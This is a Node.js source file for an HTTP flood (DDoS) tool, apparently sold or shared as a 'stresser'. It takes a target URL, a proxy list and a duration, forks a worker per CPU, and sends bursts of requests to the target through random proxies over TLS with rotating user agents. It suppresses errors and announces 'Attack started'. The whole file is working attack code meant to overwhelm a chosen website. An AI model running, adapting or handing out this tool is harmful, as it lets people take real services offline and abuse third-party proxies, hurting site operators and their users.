

//node http [URL] [PROXYLIST] [TIME] [METHOD REQUEST (GET/POST)]

const net = require('net');
const fs = require('fs');
const url = require('url');
const request_2 = require('request');
const { constants } = require('crypto');
var theJar = request_2.jar();
const path = require("path");
const http = require('http');
const tls = require('tls');
const execSync = require('child_process').execSync;

var VarsDefinetions = {
Objetive: process.argv[2],
ProxyFile: process.argv[3],
MethodRequest: process.argv[5],
time: process.argv[4]
}

try {

    var colors = require('colors');

} catch (err) {

    console.log('[36mInstalling the requirements');
    execSync('npm install colors');
    console.log('Done.');
    process.exit();
}

var fileName = __filename;
var file = path.basename(fileName);

try {

    var proxies = fs.readFileSync(VarsDefinetions.ProxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n');

} catch (err) {

    if (err.code !== 'ENOENT') throw err;
    console.log('Proxy list not found.');
    console.log("node " + file + " <Target> <proxies> <duration>");
    process.exit();
}

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});
require('events').EventEmitter.defaultMaxListeners = Infinity;

function getRandomNumberBetween(min,max){
    return Math.floor(Math.random()*(max-min+1)+min);
}

var parsed = url.parse(VarsDefinetions.Objetive);
process.setMaxListeners(15);
let browser_saves = '';

const UAs = [
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
];


const cluster = require('cluster');
const { cpus } = require('os');

const numCPUs = cpus().length;

if (cluster.isPrimary) {

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`worker ${worker.process.pid} died`);
  });
} else {

function BuildRequest() {
var raw_socket = `${VarsDefinetions.MethodRequest} `+
VarsDefinetions.Objetive+
' HTTP/1.2\r\nHost: '+parsed.host+'\r\nReferer: '+
VarsDefinetions.Objetive+'\r\nOrigin: '+
VarsDefinetions.Objetive+
'\r\nAccept: */*\r\nuser-agent: '+
 UAs[Math.floor(Math.random() * UAs.length)] +
 '\r\nUpgrade-Insecure-Requests: 1\r\n'+
 'Accept-Encoding: *\r\n'+
 'Accept-Language: en-US,en;q=0.9\r\n'+
 'Connection: Keep-Alive\r\n\r\n'
return raw_socket;
}

setInterval(function() {

var aa = getRandomNumberBetween(100, proxies.length-400);

var proxy = proxies[Math.floor(Math.random() * aa)];
proxy = proxy.split(':');

const agent = new http.Agent({
keepAlive: true,
keepAliveMsecs: 50000,
maxSockets: Infinity,
});

var tlsSessionStore = {};

var req = http.request({
    host: proxy[0],
    agent: agent,
    globalAgent: agent,
    port: proxy[1],
      headers: {
    'Host': parsed.host,
    'Proxy-Connection': 'Keep-Alive',
    'Connection': 'Keep-Alive',
  },
    method: 'CONNECT',
    path: parsed.host+':443'
}, function(){ 
    req.setSocketKeepAlive(true);
 });

req.on('connect', function (res, socket, head) {//open raw request
    tls.authorized = true;
    tls.sync = true;
    var TlsConnection = tls.connect({
        ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
        secureProtocol: ['TLSv1_2_method','TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2', 'TLS_OP_NO_TLS_1_1', 'TLS_OP_NO_TLS_1_0'],
        honorCipherOrder: true,
        requestCert: true,
        host: parsed.host,
        port: 80,
        secureOptions: constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_TLSv1,

        //no required xd
        /*
        secureOptions: 'TLSv1_2_method', //'SSL_OP_*',
        */

        servername: parsed.host,
        secure: true,
        rejectUnauthorized: false,
        socket: socket
    }, function () {

for (let j = 0; j < 64; j++) {//estas son las request por ip que se enviaran, si quieres crea una nueva variable para poder customizar esto en el stresser

TlsConnection.setKeepAlive(true, 10000)
TlsConnection.setTimeout(10000);
var r = BuildRequest();
TlsConnection.write(r);
//TlsConnection.write(`${VarsDefinetions.MethodRequest} `+VarsDefinetions.Objetive+' HTTP/1.2\r\nHost: '+parsed.host+'\r\nReferer: '+VarsDefinetions.Objetive+'\r\nOrigin: '+VarsDefinetions.Objetive+'\r\nAccept: */*\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: *\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: Keep-Alive\r\n\r\n');
}
});

TlsConnection.on('disconnected', () => {
    TlsConnection.destroy();
});

TlsConnection.on('timeout' , () => {
    TlsConnection.destroy();
});

TlsConnection.on('error', (err) =>{
    TlsConnection.destroy();
});

TlsConnection.on('data', (chunk) => {
    setTimeout(function () { 
        TlsConnection.abort(); 
        return delete TlsConnection
    }, 10000); 
});

    TlsConnection.on('end', () => {
      TlsConnection.abort();
      TlsConnection.destroy();
    });

}).end()
}, 0);
}

//jeff descomenta esto si quieres que el ataque expire cuando el time que pusiste termine

/*
setTimeout(() => {
  process.exit(1);
}, VarsDefinetions.time)
*/

console.log('Attack started to '+VarsDefinetions.Objetive);